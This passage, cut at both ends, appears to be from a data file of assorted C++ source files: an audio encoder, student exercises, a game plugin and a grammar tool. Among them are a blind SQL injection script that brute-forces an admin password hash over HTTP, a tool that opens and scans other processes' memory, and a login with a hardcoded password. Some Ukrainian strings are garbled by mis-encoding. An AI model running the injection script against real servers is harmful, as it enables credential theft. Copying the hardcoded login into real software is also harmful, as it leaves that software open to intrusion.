  p_aacHandle = NULL;\n    p_aacInfo = NULL;\n    memset(&s_aacConfig, 0, sizeof(s_aacConfig));\n}\n\naacEncode::~aacEncode() {\n    if(!p_aacHandle) {\n        return;\n    }\n\n    if(aacEncClose((HANDLE_AACENCODER*)(&p_aacHandle)) != AACENC_OK) {\n        ALOGE(\"aacEncClose Failed\");\n        return;\n    }\n}\n\nbool aacEncode::aacConfigure(aacConfigType * p_aacConfig) {\n    if(!p_aacConfig) {\n        return false;\n    }\n\n    memcpy(&s_aacConfig, p_aacConfig, sizeof(s_aacConfig));\n\n    /* Configure AAC encoder here */\n\n    AACENC_ERROR err = AACENC_OK;\n\n    p_aacInfo = (void*)new(aacInfo);\n    if(!p_aacInfo) {\n        ALOGE(\"Failed to allocate aacInfo\");\n        return false;\n    }\n\n    /* Open AAC encoder */\n    err = aacEncOpen((HANDLE_AACENCODER*)(&p_aacHandle),\n                      0x01 /* AAC */,\n                      s_aacConfig.n_channels);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed top open AAC encoder\");\n        return false;\n    }\n\n    /* Set Bitrate and SampleRate */\n    err = aacEncoder_SetParam((HANDLE_AACENCODER)p_aacHandle,\n                               AACENC_BITRATE,\n                               s_aacConfig.n_bitrate);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed to set bitrate param to AAC encoder\");\n        return false;\n    }\n\n    err = aacEncoder_SetParam((HANDLE_AACENCODER)p_aacHandle,\n                                   AACENC_SAMPLERATE,\n                                   s_aacConfig.n_sampleRate);\n\n    if(err != AACENC_OK) {\n        ALOGE(\"Failed to set samplerate param to AAC encoder\");\n        return false;\n    }\n\n    /* Fix Channel mode and order */\n    /* TODO */\n\n    /* Prefill encode structures */\n    /* TODO */\n\n    return true;\n}\n\nbool aacEncode::aacEncodeFrame(unsigned char * p_inBuffer,\n                              unsigned int n_inSize,\n                              unsigned char * p_outBuffer,\n                              unsigned int n_outSize,\n                              unsigned int * p_length) {\n    (void)n_inSize;\n    (void)n_outSize;\n    (void)p_length;\n    if(!p_inBuffer || !p_outBuffer) {\n        ALOGE(\"No buffers provided for AAC encoder\");\n        return false;\n    }\n\n    aacInfo *tempAacInfo = (aacInfo*)p_aacInfo;\n    tempAacInfo->inBuff.bufs = (void**) (&p_inBuffer);\n    tempAacInfo->outBuff.bufs = (void**) (&p_outBuffer);\n\n    AACENC_ERROR err = AACENC_OK;\n\n    if(p_aacHandle) {\n        err = aacEncEncode((HANDLE_AACENCODER)p_aacHandle,\n                           &tempAacInfo->inBuff,\n                           &tempAacInfo->outBuff,\n                           &tempAacInfo->inArg,\n                           &tempAacInfo->outArg);\n\n        if(err != AACENC_OK) {\n            ALOGE(\"Failed to encode buffer\");\n            return false;\n        }\n    } else {\n        ALOGE(\"No encoder available\");\n        return false;\n    }\n\n    return true;\n}\n",
    "#include <iostream>\r\n#include <winsock2.h>\r\n#include <ws2tcpip.h>\r\n#include <string>\r\n#include <vector>\r\n#include <thread>\r\n#include <mutex>\r\n#include <queue>\r\n#include <functional>\r\n#include <condition_variable> \r\n\r\n#pragma comment(lib, \"ws2_32.lib\")\r\n\r\nstruct HttpRequestResult {\r\n    std::string response;\r\n    int status;\r\n};\r\n\r\nHttpRequestResult sendHttpRequest(const char *hostname, const char *port, const char *request) {\r\n    std::cout << \"Sending request: \" << request << std::endl; // Print the request\r\n    HttpRequestResult result;\r\n    WSADATA wsaData;\r\n    result.status = WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    if (result.status != 0) {\r\n        std::cerr << \"WSAStartup failed.\\n\";\r\n        return result;\r\n    }\r\n\r\n    SOCKET ConnectSocket = INVALID_SOCKET;\r\n    struct addrinfo *resultAddr = NULL, *ptr = NULL, hints;\r\n\r\n    ZeroMemory(&hints, sizeof(hints));\r\n    hints.ai_family = AF_UNSPEC;\r\n    hints.ai_socktype = SOCK_STREAM;\r\n    hints.ai_protocol = IPPROTO_TCP;\r\n\r\n    result.status = getaddrinfo(hostname, port, &hints, &resultAddr);\r\n    if (result.status != 0) {\r\n        std::cerr << \"getaddrinfo failed: \" << result.status << \"\\n\";\r\n        WSACleanup();\r\n        return result;\r\n    }\r\n\r\n    for (ptr = resultAddr; ptr != NULL; ptr = ptr->ai_next) {\r\n        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);\r\n        if (ConnectSocket == INVALID_SOCKET) {\r\n            std::cerr << \"Error at socket(): \" << WSAGetLastError() << \"\\n\";\r\n            freeaddrinfo(resultAddr);\r\n            WSACleanup();\r\n            return result;\r\n        }\r\n\r\n        result.status = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);\r\n        if (result.status == SOCKET_ERROR) {\r\n            closesocket(ConnectSocket);\r\n            ConnectSocket = INVALID_SOCKET;\r\n            continue;\r\n        }\r\n        break;\r\n    }\r\n\r\n    freeaddrinfo(resultAddr);\r\n\r\n    if (ConnectSocket == INVALID_SOCKET) {\r\n        std::cerr << \"Unable to connect to server!\\n\";\r\n        WSACleanup();\r\n        return result;\r\n    }\r\n\r\n    result.status = send(ConnectSocket, request, (int)strlen(request), 0);\r\n    if (result.status == SOCKET_ERROR) {\r\n        std::cerr << \"send failed: \" << WSAGetLastError() << \"\\n\";\r\n        closesocket(ConnectSocket);\r\n        WSACleanup();\r\n        return result;\r\n    }\r\n\r\n    char recvbuf[4096];\r\n    int bytesReceived = 0;\r\n    std::string response;\r\n    while ((bytesReceived = recv(ConnectSocket, recvbuf, 4096, 0)) > 0) {\r\n        recvbuf[bytesReceived] = '\\0';\r\n        response += recvbuf;\r\n    }\r\n\r\n    result.response = response;\r\n    std::cout << \"Response: \" << result.response << std::endl;\r\n\r\n    closesocket(ConnectSocket);\r\n    WSACleanup();\r\n\r\n    return result;\r\n}\r\n\r\nclass ThreadPool {\r\npublic:\r\n    ThreadPool(size_t threads) : stop(false) {\r\n        for (size_t i = 0; i < threads; ++i)\r\n            workers.emplace_back([this] {\r\n                for (;;) {\r\n                    std::function<void()> task;\r\n                    {\r\n                        std::unique_lock<std::mutex> lock(this->mtx);\r\n                        this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });\r\n                        if (this->stop && this->tasks.empty())\r\n                            return;\r\n                        task = std::move(this->tasks.front());\r\n                        this->tasks.pop();\r\n                    }\r\n                    task();\r\n                }\r\n            });\r\n    }\r\n\r\n    template <class F>\r\n    void enqueue(F &&f) {\r\n        {\r\n            std::unique_lock<std::mutex> lock(mtx);\r\n            tasks.emplace(std::forward<F>(f));\r\n        }\r\n        condition.notify_one();\r\n    }\r\n\r\n    ~ThreadPool() {\r\n        {\r\n            std::unique_lock<std::mutex> lock(mtx);\r\n            stop = true;\r\n        }\r\n        condition.notify_all();\r\n        for (std::thread &worker : workers)\r\n            worker.join();\r\n    }\r\n\r\nprivate:\r\n    std::vector<std::thread> workers;\r\n    std::queue<std::function<void()>> tasks;\r\n    std::mutex mtx;\r\n    std::condition_variable condition;\r\n    bool stop;\r\n};\r\n\r\nstd::string getAdminHashedPassword(int passwordLength, std::string &hashedPassword) {\r\n    const char *hostname = \"localhost\";\r\n    const char *port = \"8080\";\r\n    std::string request = \"GET /users?username=admin%27%20and%20substr(password,\";\r\n    const std::string endRequest = \" HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: keep-alive\\r\\n\\r\\n\";\r\n    const std::string symbols = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\r\n\r\n    ThreadPool pool(100); \r\n\r\n    for (int i = 1; i <= passwordLength; ++i) {\r\n        bool found = false;\r\n        for (char c : symbols) {\r\n            pool.enqueue([hostname, port, request, endRequest, symbols, i, passwordLength, &hashedPassword, c, &found]() { \r\n                if (!found) {\r\n                    std::string req = request + std::to_string(i) + \",1)%20=%20%27\" + c + endRequest;\r\n        ",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: oldault <oldault@student.42.fr>            +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/02 10:23:07 by svolodin          #+#    #+#             */\n/*   Updated: 2024/05/04 09:59:48 by oldault          ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Dog.hpp\"\n#include \"Cat.hpp\"\n#include \"WrongCat.hpp\"\n\nint main()\n{\n\tstd::cout << std::endl;\n\t/* Requested Test case */\n\t{\n\t\tconst int size = 6;\n    Animal** animals = new Animal*[size];\n    for (int i = 0; i < size / 2; ++i) {\n\t\t\tanimals[i] = new Dog();\n    }\n    for (int i = size / 2; i < size; ++i) {\n\t\t\tanimals[i] = new Cat();\n    }\n    for (int i = 0; i < size; ++i) {\n\t\t\tanimals[i]->makeSound();\n    }\n    for (int i = 0; i < size; ++i) {\n\t\t\tdelete animals[i];\n    }\n    delete[] animals;\n\t}\n\tstd::cout << std::endl;\n\t/* Setters and Getters for Ideas */\n\t{\n\t\tCat* cat = new Cat();\n\t\tcat->setCatIdea(\"Bring master a dead mouse\", 5);\n\t\tstd::cout << \"\\tThe cat is thinking to: \" ITAL( << cat->getCatIdea(5) << ) \".\\n\";\n\t\t\n\t\tdelete cat;\n\t}\n\tstd::cout << std::endl;\n\t/* copy assignements/operators for the Brain */\n\t{\n    Dog* dog = new Dog();\n    dog->setDogIdea(\"Catch that squirrel\", 10);\n    dog->setDogIdea(\"Shit on the carpet\", 42);\n    std::cout << \"\\tDog 1 is thinking to: \" ITAL( << dog->getDogIdea(10) << ) \".\\n\";\n\n    Dog* dog2 = new Dog(*dog);\n    std::cout << \"\\tDog 2 is thinking to: \" ITAL( << dog2->getDogIdea(10) << ) \".\\n\";\n\n\t\tDog* dog3 = new Dog();\n\t\t*dog3 = *dog2;\n    std::cout << \"\\tDog 3 is thinking to: \" ITAL( << dog3->getDogIdea(42) << ) \".\\n\";\n\n    delete dog3;\n    delete dog2;\n    delete dog;\n\t}\n\t\n\tstd::cout << std::endl;\n\treturn 0;\n}\n",
    "#include <iostream>\r\n#include <cassert>\r\n#include <cstdlib>\r\n#include <Windows.h>\r\n#include <Psapi.h>\r\n#include <tlhelp32.h>\r\n\r\n#define MAX_STR_SIZE 192\r\n#define MAX_MODULE_AMOUNT 128\r\n#define MAX_MEM_AMOUNT 10000\r\n\r\n#define MAX_MODULE_AMOUNT_IN_BYTES MAX_MODULE_AMOUNT * sizeof(HMODULE)\r\n\r\n#undef min\r\n#undef Process32First\r\n#undef Process32Next\r\n#undef PROCESSENTRY32\r\n\r\nUCHAR strcmp_leastchar(const char* a, const char* b, const char* la = nullptr)\r\n{\r\n\tconst char* lb = b;\r\n\r\n\tif (la == nullptr)\r\n\t{\r\n\t\tla = a;\r\n\t\twhile (*la) la++;\r\n\t}\r\n\r\n\twhile (*lb) lb++;\r\n\r\n\tint min_size = -std::min(la - a, lb - b);\r\n\tUCHAR c = 0;\r\n\r\n\tfor (int i = -1; i >= min_size; i--)\r\n\t\tc += (la[i] == lb[i]);\r\n\r\n\treturn c;\r\n}\r\n\r\nstd::string GetLastErrorAsString()\r\n{\r\n\t//Get the error message ID, if any.\r\n\tDWORD errorMessageID = ::GetLastError();\r\n\tif (errorMessageID == 0) {\r\n\t\treturn std::string(); //No error message has been recorded\r\n\t}\r\n\r\n\tLPSTR messageBuffer = nullptr;\r\n\r\n\t//Ask Win32 to give us the string version of that message ID.\r\n\t//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).\r\n\tsize_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\r\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);\r\n\r\n\t//Copy the error message into a std::string.\r\n\tstd::string message(messageBuffer, size);\r\n\r\n\t//Free the Win32's string's buffer.\r\n\tLocalFree(messageBuffer);\r\n\r\n\treturn message;\r\n}\r\n\r\nstruct mem_info_s\r\n{\r\n\tvoid* BaseAddress;\r\n\tSIZE_T RegionSize;\r\n\tbool is_priorited;\r\n};\r\n\r\nsize_t app_mem_size = 0;\r\n\r\nstruct info_s\r\n{\r\n\tbool alive;\r\n\r\n\tDWORD pId, module_amount, error_code;\r\n\tHMODULE* modules;\r\n\tMODULEINFO* module_infos;\r\n\r\n\tsize_t buck_mem_size;\r\n\r\n\tHMODULE main_module;\r\n\tvoid* module_base;\r\n\tMODULEINFO main_module_info;\r\n\tLPSTR main_module_file_name;\r\n\r\n\tmem_info_s* mem_addresses;\r\n\tDWORD mem_amount;\r\n\r\n\tHANDLE proc;\r\n\r\n\tinfo_s(DWORD pId_In) : pId(pId_In)\r\n\t{\r\n\t\tmodule_infos = nullptr;\r\n\t\tmem_addresses = nullptr;\r\n\t\tmem_amount = 0;\r\n\t\talive = false;\r\n\t\tmain_module = 0;\r\n\t\tmain_module_info = { nullptr, 0, nullptr };\r\n\t\tmodule_amount = error_code = 0;\r\n\t\tmodules = nullptr;\r\n\t\tproc = nullptr;\r\n\r\n\t\tmain_module_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\t\tLPSTR cache_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\r\n\t\tif (main_module_file_name == nullptr || cache_file_name == nullptr) {\r\n\t\t\terror_code = 1;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmain_module_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\t\tcache_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\r\n\t\tmodules = (HMODULE*)malloc(MAX_MODULE_AMOUNT_IN_BYTES);\r\n\t\tmodule_infos = (MODULEINFO*)malloc(MAX_MODULE_AMOUNT * sizeof(MODULEINFO));\r\n\r\n\t\tif (modules == nullptr || module_infos == nullptr) {\r\n\t\t\terror_code = 2;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId_In);\r\n\r\n\t\tGetProcessImageFileNameA(proc, main_module_file_name, MAX_STR_SIZE);\r\n\r\n\t\tEnumProcessModules(proc, modules, MAX_MODULE_AMOUNT_IN_BYTES, &module_amount);\r\n\r\n\t\tif (module_amount > MAX_MODULE_AMOUNT_IN_BYTES) {\r\n\t\t\terror_code = 3;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmodule_amount /= sizeof(HMODULE);\r\n\r\n\t\tconst char* least_char_on_main = main_module_file_name;\r\n\t\twhile (*least_char_on_main) least_char_on_main++;\r\n\r\n\t\tMODULEINFO module_info;\r\n\r\n\t\tfor (DWORD i = 0; i < module_amount; i++)\r\n\t\t{\r\n\t\t\tDWORD err = GetModuleFileNameA(modules[i], cache_file_name, MAX_STR_SIZE);\r\n\t\t\tGetModuleInformation(proc, modules[i], &module_info, sizeof(MODULEINFO));\r\n\t\t\tmodule_infos[i] = module_info;\r\n\r\n\t\t\tif (err == 0)\r\n\t\t\t{\r\n\t\t\t\tcache_file_name[0] = '?';\r\n\t\t\t\tcache_file_name[1] = '\\0';\r\n\t\t\t}\r\n\r\n\t\t\tstd::cout << i << \":\\t\" << module_info.lpBaseOfDll << \": \" << cache_file_name << '\\n';\r\n\t\t}\r\n\r\n\t\tmain_module_info = module_infos[0];\r\n\t\tmain_module = modules[0];\r\n\r\n\t\tmodule_base = (void*)main_module;\r\n\r\n\t\tfree(cache_file_name);\r\n\r\n\t\tstd::cout << \"\\nModule Name:\\t\" << main_module_file_name\r\n\t\t\t<< \"\\nModule Base:\\t0x\" << module_base\r\n\t\t\t<< \"\\nCum Base:\\t0x\" << main_module_info.EntryPoint\r\n\t\t\t<< \"\\nModule Size:\\t\" << main_module_info.SizeOfImage\r\n\t\t\t<< \"\\nModule Amount:\\t\" << module_amount\r\n\t\t\t<< \"\\npId:\\t\\t\" << pId\r\n\t\t\t<< std::endl;\r\n\r\n\t\talive = true;\r\n\t}\r\n\r\n\tvoid get_memory_infos()\r\n\t{\r\n\t\tif (alive == false)\r\n\t\t\treturn;\r\n\r\n\t\tif (mem_addresses == nullptr)\r\n\t\t\tmem_addresses = (mem_info_s*)malloc(MAX_MEM_AMOUNT * sizeof(mem_info_s));\r\n\r\n\t\tbuck_mem_size = 0;\r\n\t\tmem_amount = 0;\r\n\r\n\t\tMEMORY_BASIC_INFORMATION mem_info;\r\n\t\tvoid* next_scan_start = nullptr;\r\n\r\n\t\twhile (VirtualQueryEx(proc, next_scan_start, &mem_info, sizeof(MEMORY_BASIC_INFORMATION)))\r\n\t\t{\r\n\t\t\tnext_scan_start = (char*)mem_info.BaseAddress + mem_info.RegionSize;\r\n\r\n\t\t\tif (mem_info.State == MEM_COMMIT && next_scan_start < (void*)0x00007FF000000000)\r\n\t\t\t{\r\n\t\t\t\tif (mem_info.RegionSize > app_mem_size)\r\n\t\t\t\t\tbuck_mem_size++;\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tmem_addresses[mem_amount].is_priorited = (mem_info.BaseAddress == mem_i",
    "#include <iostream>\r\n#include <fstream>\r\n#include <conio.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <iomanip>\r\n#include <vector>\r\nusing namespace std;\r\n////////////////////////////////////////////////////////////////////\r\nclass Student{\r\n    private:\r\n        string Name;\r\n        int RollNo;\r\n        int Marks;\r\n        long PhoneNo;\r\n    public:\r\n        Student(string Name=\"\",int RollNo=0 ,int Marks=0 ,long PhoneNo=0){\r\n            this->Name = Name;\r\n            this->RollNo = RollNo;\r\n            this->Marks = Marks;\r\n            this->PhoneNo = PhoneNo;\r\n        }\r\n        string getName(){return Name;}\r\n        long getRollNo(){return RollNo;}\r\n        int getMarks(){return Marks;}\r\n        long getPhoneNo(){return PhoneNo;}\r\n        void sortStudent();\r\n\r\n        vector<Student> studentRecord; \r\n        void rawData(){\r\n            for (int i = 0; i < 10; ++i) {\r\n                string name = \"Student\" + to_string(i + 1);\r\n                int rollno = 10 + i*33;\r\n                int marks = 121 + i*2;\r\n                long phoneNo = (i*7 + 1) * 8919;\r\n\r\n                Student newStudent(name, rollno, marks, phoneNo);\r\n                studentRecord.push_back(newStudent);\r\n                sortStudent();\r\n            }\r\n        }\r\n        void systemLogo();\r\n        void thanksMSG();\r\n        void welcomeMSG();\r\n\r\n};\r\n////////////////////////////////////////////////////////////////////\r\nclass AdminControl : public Student{\r\n    public:\r\n        void adminLogin();\r\n        void AddNewStudent();\r\n        void showAllStudent();\r\n        void removeStudent();\r\n        void showAdminWindow();\r\n        void logOut();\r\n};\r\n////////////////////////////////////////////////////////////////////\r\nvoid Student :: systemLogo(){\r\n    ifstream in(\"welStudent.txt\");\r\n    if(!in){\r\n        cout<< \"Cannot open input file.\\n\";\r\n    }\r\n    char str[1000];\r\n    while(in){\r\n        in.getline(str,1000);\r\n        if(in){\r\n            cout<<str<<endl;\r\n        }\r\n    }\r\n    in.close();\r\n}\r\n////////////////////////////////////////////////////////////////////\r\nvoid Student :: sortStudent(){\r\n    string temp;\r\n    for(int i=0;i<studentRecord.size();i++){\r\n        for(int j=i+1;j<studentRecord.size();j++){\r\n            if((studentRecord[i].getName().compare(studentRecord[j].getName()) > 0)){\r\n                // strcpy(temp,studentRecord[i].getStudentName());\r\n                swap(studentRecord[i], studentRecord[j]);\r\n                \r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n////////////////////////////////////////////////////////////////////\r\n\r\n////////////////////////////////////////////////////////////////////\r\n\r\nvoid AdminControl :: adminLogin(){\r\n    system(\"cls\");\r\n    rawData();\r\n    systemLogo();\r\n    string name;\r\n    int pass;\r\n    cout<<\"\\n\\n\\n\\n\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t     Admin Authentication :) \\n\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t--------------------------------\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t            LOGIN  \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t--------------------------------\\n\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t Enter Your Name : \";\r\n    cin>>name;\r\n    cout<<\"\\t\\t\\t\\t\\t Enter Your Password : \";\r\n    cin>>pass;\r\n    if(name == \"sachin\" && pass == 123){\r\n        sleep(1);\r\n        cout<<\"\\n\\t\\t\\t\\t\\t Access Granted :) \\n\";\r\n        sleep(1);\r\n        cout<<\"\\n\\n\\nProcessing ... \";\r\n        sleep(2);\r\n        showAdminWindow();\r\n        \r\n    }\r\n    else{\r\n        cout<<\"\\n\\t\\t\\t\\t\\t Access Denied :) \\n\";\r\n        sleep(1);\r\n        adminLogin();\r\n    }\r\n}\r\n////////////////////////////////////////////////////////////////////\r\nvoid AdminControl :: logOut(){\r\n    system(\"cls\");\r\n    cout<<\"\\n\\n\";\r\n    thanksMSG();\r\n}\r\n////////////////////////////////////////////////////////////////////\r\nvoid AdminControl :: showAdminWindow(){\r\n    system(\"cls\");\r\n    char choice;\r\n    systemLogo();\r\n    cout<<\"\\n\\n\\n\\n\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t             STUDENT MANAGEMENT SYSTEM (*-*) \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t|-------------------------------------------------------|\\n\"<<endl;\r\n    cout<<\"\\t\\t\\t\\t\\t   1. Add New Student \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t   2. Remove A Student \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t   3. Show All Student Record \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t   4. LogOut \\n\"<<endl;\r\n    cout<<\"\\t\\t\\t\\t\\t|-------------------------------------------------------|\\n\"<<endl;\r\n    cout<<\"\\nSelect Any Option : \";\r\n    sleep(1);\r\n    cin>>choice;\r\n    if(choice == '1'){\r\n        sleep(1);\r\n        AddNewStudent();\r\n    }\r\n    if(choice == '2'){\r\n        sleep(1);\r\n        removeStudent();\r\n    }\r\n    if(choice == '3'){\r\n        sleep(1);\r\n        showAllStudent();\r\n    }\r\n    if(choice == '4'){\r\n        sleep(1);\r\n        logOut();\r\n    }\r\n    else{\r\n        cout<<\"Invalid Choice :)\";\r\n        sleep(1);\r\n        showAdminWindow();\r\n    }\r\n    \r\n\r\n}\r\n////////////////////////////////////////////////////////////////////\r\nvoid AdminControl :: AddNewStudent(){\r\n    system(\"cls\");\r\n    sleep(1);\r\n    systemLogo();\r\n    string name;\r\n    int rollno,marks;\r\n    long p",
    "#include \"plugin.h\"\n#include \"CRunningScript.h\"\n#include \"CTheScripts.h\"\n#include \"CMessages.h\"\n//#include \"ScmExtenderAPI.h\"\n\nclass ScmExtender {\npublic: \n    static inline std::unordered_map<int32_t, int8_t(*)(int32_t*)> mapOfNewOpcodes = {};\n\n    static __declspec(dllexport) void AddOneCommand(int32_t command, int8_t(*func)(int32_t*)) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end())\n            std::cout << \"[SCRIPT] Command id \" << command << \" overwritten\" << std::endl;\n\n        mapOfNewOpcodes[command] = func;\n    }\n\n    static inline CRunningScript* currentScript = nullptr;\n    static __declspec(dllexport) void CollectParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "// dz18.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Employee {\n    string lastName;\n    int yearOfBirth;\n    string position;\n    double salary;\n    string education;\n};\nint main() {\n    setlocale(LC_ALL, \"Ukr\");\n    Employee employees[5] = {\n        {\"Zagorulko\", 1980, \"Traktoryst\", 50000, \"Ptu-28\"},\n        {\"Garbuz\", 1975, \"Agronom\", 60000, \"Dokuchaeva\"},\n        {\"Koval\", 1960, \"Zootechnik\", 70000, \"Veterinarna akademia\"},\n        {\"Patsiuk\", 1990, \"Kombainer\", 55000, \"Ptu-28\"},\n        {\"Kulik\", 1985, \"Vodii\", 45000, \"Ptu-28\"}\n    };\n\n    \n\n    int count = 0;\n    cout << \"\u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2:\" << endl;\n    for (int i = 0; i < 5; ++i) {\n        if (2024 - employees[i].yearOfBirth > 60) {\n            cout << \"\u00cf\u00f0\u00b3\u00e7\u00e2\u00e8\u00f9\u00e5: \" << employees[i].lastName << endl;\n            cout << \"\u00d0\u00b3\u00ea \u00ed\u00e0\u00f0\u00ee\u00e4\u00e6\u00e5\u00ed\u00ed\u00ff: \" << employees[i].yearOfBirth << endl;\n            cout << \"\u00cf\u00ee\u00f1\u00e0\u00e4\u00e0: \" << employees[i].position << endl;\n            cout << \"\u00c7\u00e0\u00f0\u00ef\u00eb\u00e0\u00f2\u00e0: \" << employees[i].salary << endl;\n            cout << \"\u00ce\u00f1\u00e2\u00b3\u00f2\u00e0: \" << employees[i].education << endl << endl;\n            ++count;\n        }\n    }\n    cout << \"\u00c7\u00e0\u00e3\u00e0\u00eb\u00fc\u00ed\u00e0 \u00ea\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ef\u00f0\u00e0\u00f6\u00b3\u00e2\u00ed\u00e8\u00ea\u00b3\u00e2 \u00f1\u00f2\u00e0\u00f0\u00f8\u00e8\u00f5 \u00e7\u00e0 60 \u00f0\u00ee\u00ea\u00b3\u00e2: \" << count << endl;\n\n    return 0;\n}\n\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if 